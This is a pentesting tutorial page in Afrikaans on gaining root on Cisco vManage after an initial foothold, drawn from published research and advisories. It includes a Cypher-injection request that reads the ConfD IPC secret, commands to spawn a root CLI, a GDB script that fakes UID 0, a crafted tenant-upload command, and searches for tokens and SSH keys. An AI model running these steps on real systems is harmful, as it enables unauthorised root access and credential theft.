# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Sodra jy code execution op Cisco vManage / *Catalyst SD-WAN Manager* as `vmanage`, `netadmin`, of `vmanage-admin` het, is die interessantste plaaslike privesc-oppervlakke gewoonlik die `confd` CLI stack, die `cmdptywrapper`-helper, localhost REST APIs, en root-owned import/upload handlers.

As jy steeds die **aanvanklike foothold** op ’n controller benodig, kyk eers na die toegewyde control-plane-bladsy:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Vinnige plaaslike triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
As `/etc/confd/confd_ipc_secret` vanaf jou foothold leesbaar is, word Pad 1 en Pad 2 onmiddellik prakties. As jy via 'n remote file disclosure of webshell aankom, ondersoek ook `vmanage-admin` se SSH-materiaal en multitenancy upload handlers; onlangse navorsing het albei as lewensvatbare pivots gedemonstreer.<sup>[[3]](#references)[[4]](#references)</sup>

## Pad 1

Synacktiv se vManage-assessment dokumenteer hierdie root-shell path.<sup>[[5]](#references)</sup>

Die [ConfD-dokumentasie](http://66.218.245.39/doc/html/rn03re18.html) waarna die verslag skakel, beskryf IPC-authentication; sy vManage-voorbeeld plaas die secret by `/etc/confd/confd_ipc_secret` en wys dat dit deur `vmanage` gelees kan word.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Omdat Neo4j met `vmanage`-voorregte in die gerapporteerde opstelling loop, kan die vroeëre Cypher-inspuiting die geheime lêer lees.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` self aanvaar nie command-line arguments nie; dit roep `/usr/bin/confd_cli_user` aan. Die gerapporteerde workflow onttrek daardie helper wat deur root gelees kan word uit die rootfs, kopieer dit via `scp`, lees sy help, stel `CONFD_IPC_ACCESS_FILE` in, en roep dit met `-U 0 -G 0` aan om ’n root-shell te verkry.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Pad 2

Hierdie alternatiewe roete is aangepas uit Walmart Global Tech se vManage 19.2.2-navorsing.<sup>[[6]](#references)</sup>

Die Synacktiv-roete benodig 'n kopie van `/usr/bin/confd_cli_user`, wat in die gerapporteerde opstelling deur root gelees kan word; die Walmart-verslag wysig eerder `confd_cli` se identiteitswaardes onder GDB.<sup>[[5]](#references)[[6]](#references)</sup>

Die verslag se disassembly wys dat `confd_cli` die oproeper se UID en GID versamel.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump wat UID/GID-versameling toon</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Dieselfde toets het getoon dat ’n `cmdptywrapper` wat deur root besit word, eksplisiete `-g`- en `-u`-waardes ontvang het.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Die navorser het afgelei dat `confd_cli` die aangemelde gebruiker se UID en GID na `cmdptywrapper` aanstuur.<sup>[[6]](#references)</sup>

Om `cmdptywrapper` direk met `-g 0 -u 0` uit te voer, het misluk omdat die vereiste lêerbeskrywer (`-i 1015` in die voorbeeld) nie beskikbaar was nie.<sup>[[6]](#references)</sup>

Omdat `confd_cli` nie daardie waardes as argumente blootstel nie, gebruik die verslag GDB om die terugkeerwaardes van `getuid()` en `getgid()` te oorskryf; GDB was op daardie toestel beskikbaar.<sup>[[5]](#references)[[6]](#references)</sup>

Met `vmanage`-toegang kon die toets `/etc/confd/confd_ipc_secret` lees; die volgende script dwing albei identiteitsaanroepe om nul terug te gee.<sup>[[6]](#references)</sup>

Die GDB-script wat in die verslag gebruik is, is:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Die gerapporteerde konsole-uitset is:<sup>[[6]](#references)</sup>

<details>
<summary>Konsole-uitset</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Pad 3 (2025 CLI-invoervalidation-bug - CVE-2025-20122)

Cisco het later 'n skoner plaaslike root-pad in sy eie advisory vir [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) gedokumenteer. 'n **Geauthentiseerde aanvaller met slegs leesalleen-privileges** kon 'n spesiaal vervaardigde versoek na die manager CLI stuur en root verkry weens onvoldoende invoervalidation.<sup>[[7]](#references)</sup>

Vanuit 'n offensiewe perspektief dui hierdie advisory en die vroeëre CLI-navorsing op die volgende werksvloei.<sup>[[6]](#references)[[7]](#references)</sup>

1. Sodra jy *enige* low-priv-vastrapplek op die box het, moet jy die plaaslike CLI-diens toets voordat jy met die swaarder Pad 1 / Pad 2-werksvloei voortgaan.
2. Hergebruik die artifacts van Pad 2 om die trust boundary te vind: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Behandel elke veld wat na die CLI-backend aangestuur word as verdag: UID/GID, gebruikersnaam, terminal-metadata, ingevoerde lêers, of enige waarde wat later deur 'n root-owned helper gebruik word.
4. As 'n low-priv-gebruiker toegang tot die plaaslike CLI-socket kan verkry en daardie velde kan beïnvloed, kan root slegs een spesiaal vervaardigde versoek ver wees.

Nadat jy op die appliance geland het, inspekteer die plaaslike CLI-ketting soos volg.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Hierdie verander die 2025-bug in ’n herbruikbare hunting-patroon: soek na **local CLI shims wat identity in userland versamel en dit na ’n privileged wrapper aanstuur**.<sup>[[6]](#references)[[7]](#references)</sup>

Moenie **CVE-2025-20122** met die latere **CVE-2026-20122** verwar nie: die 2025-kwessie is ’n *local* CLI-to-root-bug, terwyl die 2026-kwessie ’n *remote* API arbitrary file overwrite is wat hoofsaaklik nuttig is om ’n foothold te plant en daarna terug te keer na Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco se February 2026-advisory beskryf nog ’n nuttige privesc-klas, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). ’n **Authenticated, local attacker with low privileges** kon root verkry weens ’n onvoldoende user-authentication-meganisme in die REST API.<sup>[[1]](#references)</sup>

Dit is belangrik omdat vManage-privesc nie meer tot `confd`/TTY-abuse beperk is nie; nadat jy ’n low-priv shell verkry het, moet jy ook vir die volgende hunt.<sup>[[1]](#references)</sup>

- localhost-only API endpoints wat die caller te veel vertrou
- tokens, cookies of service credentials wat vanaf die huidige account leesbaar is
- root-only actions wat deur `dataservice`/REST handlers blootgestel word en steeds plaaslik getrigger kan word

In die praktyk, sodra jy ’n shell as `vmanage` of ’n ander service user het, kan local API abuse makliker wees om te automatiseer as interactive CLI abuse.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Indien die plaaslike sessiekonteks genoeg is om bevoorregte REST-funksionaliteit te bereik, verkies die API-pad: dit is makliker om te herhaal, te script en te koppel aan gesteelde websessies of API-tokens.<sup>[[1]](#references)</sup>

## Pad 5 (2026-vervaardigde lêer deur root verwerk - CVE-2026-20245)

Nog ’n onlangse patroon is [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). ’n Plaaslike aanvaller met `netadmin`-voorregte kon ’n **vervaardigde lêer** oplaai wat die CLI later onveilig verwerk het, wat tot command injection as `root` gelei het.<sup>[[2]](#references)</sup>

Vanuit ’n HackTricks-perspektief is die waardevolle tegniek breër as die spesifieke CVE.<sup>[[2]](#references)</sup>

1. Lys elke CLI- of webworkflow op wat ’n lêer aanvaar: invoere, diagnostiese bundels, templates, validators, rugsteune, tenant-data, ens.
2. Volg waar die opgelaaide lêer beland en watter root-besitte script of binary dit verbruik.
3. Toets of die lêernaam, lêerinhoud of geparseerde metadata ooit aan shell commands, wrapper scripts of `system()`-agtige helpers deurgegee word.
4. Indien jy reeds `netadmin` kan bereik (geldige geloofsbriewe, ’n gesteelde sessie of ’n auth-bypass-ketting), is file-processing-bugs dikwels die vinnigste pad na root.

Google Cloud / Mandiant het later ’n konkrete geval getoon waar hierdie bug-klas deur die multi-tenancy-invoerpad uitgebuit is.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
In die waargenome aanval het die vervaardigde CSV `/etc/passwd` en `/etc/shadow` gewysig om ’n tydelike UID 0-rekening (`troot`) te skep. Dit maak `tenant-upload` / `tenant-list`-styl-invoerders besonder interessant: hulle is nie net data-innamefunksies nie, maar potensiële parser-voorkante wat deur root besit word.<sup>[[4]](#references)</sup>

’n Vinnige shell-kantse soekpatroon is:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Hierdie bug class skakel besonder goed met remote footholds wat `netadmin` maar nie `root` toestaan nie.<sup>[[2]](#references)[[4]](#references)</sup>

## Ander onlangse vManage/Catalyst SD-WAN Manager-vulnerabilities om te chain

- **Unauthenticated info leak (CVE-2026-20133)** – Veral waardevol omdat openbare research getoon het dat dit `confd_ipc_secret` of die `vmanage-admin` private key kan blootstel, wat 'n lees-bug in óf Path 1 óf 'n NETCONF-pivot verander.<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Anders as die 2025 CLI-bug hier bo; VulnCheck het dit gebruik om 'n webshell op te laai, wat die plaaslike privesc-paaie op hierdie bladsy onmiddellik relevant maak.<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – 'n Authenticated attacker kan script in 'n geaffekteerde gebruiker se webinterface uitvoer; bepaal of die gevolglike session context API/CLI-actions blootstel wat `vshell` of een van die plaaslike privesc-paaie hier bo bereik.<sup>[[9]](#references)</sup>
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 'n Baie sterk voorloper vir Path 5 omdat `netadmin` presies die vlak is wat deur die 2026 crafted-file privesc vereis word.<sup>[[2]](#references)[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – Soortgelyke offensive value as CVE-2026-20122, maar deur 'n latere web UI-upload path; Cisco sê dat 'n file wat deur die bug geskep of oorskryf is, later gebruik kan word om na root te elevate.<sup>[[10]](#references)</sup>
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026-intrusions het getoon dat attackers na 'n ouer, kwesbare SD-WAN-build kan terugrol, die ou CLI root-bug kan abuseer, en dan die oorspronklike weergawe kan herstel.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Beter gedokumenteer op die toegewyde SD-WAN control-plane-bladsy; dit kan 'n SSH-key vir `vmanage-admin` byvoeg, wat persistente NETCONF-toegang vir opvolgende management-plane-actions verskaf.<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, ens.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, en Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Onlangse Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Active exploitation of Cisco Catalyst SD-WAN by UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Cisco Catalyst SD-WAN Manager Arbitrary File Write Vulnerability (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Critical authentication bypass in Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
